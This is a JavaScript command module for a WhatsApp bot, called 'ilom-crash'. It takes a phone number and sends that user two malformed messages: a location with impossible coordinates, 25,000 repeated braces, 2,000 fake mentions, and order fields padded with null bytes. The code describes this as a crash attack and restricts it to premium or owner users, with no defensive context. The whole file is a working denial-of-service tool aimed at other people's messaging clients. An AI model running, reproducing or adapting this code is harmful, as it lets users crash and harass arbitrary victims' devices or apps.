import { isPremiumUser } from '../../utils/premiumStore.js';

async function memekcici(sock, target) {
    try { await sock.relayMessage(target, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "💀", hasMediaAttachment: false, locationMessage: { degreesLatitude: -6666666666, degreesLongitude: 6666666666, name: "CRASH", address: "crash.json" } }, body: { text: "\u0000" }, nativeFlowMessage: { messageParamsJson: "{".repeat(25000) }, contextInfo: { participant: target, mentionedJid: Array.from({ length: 2000 }, (_, i) => `bug${i}@s.whatsapp.net`) } } } } }, { messageId: null, participant: { jid: target }, userJid: target }); } catch {}
}
async function Ilomcrash(sock, target) { try { await sock.relayMessage(target, { viewOnceMessage: { message: { orderMessage: { orderId: "0".repeat(1000), itemCount: 99999, status: "INQUIRY", surface: "BUFFERS", message: "\u0000".repeat(500), orderTitle: "\u0000".repeat(500), sellerJid: target, token: "\u0000".repeat(500) }, messageContextInfo: { deviceListMetadata: {} } } } }, { participant: { jid: target } }); } catch {} }

export default {
    name: 'ilom-crash', aliases: ['ilom', 'ilombug'], category: 'bug',
    description: 'Ilom crash attack on a target number', usage: 'ilom <number>', cooldown: 20, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ Usage: .ilom <number>' }, { quoted: message });
        const target = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '💀', key: message.key } });
        await sock.sendMessage(from, { text: `💀 Ilom attack on ${num}` }, { quoted: message });
        await memekcici(sock, target); await Ilomcrash(sock, target);
        await sock.sendMessage(from, { text: '✅ Done' }, { quoted: message });
        await sock.sendMessage(from, { react: { text: '✅', key: message.key } });
    }
};
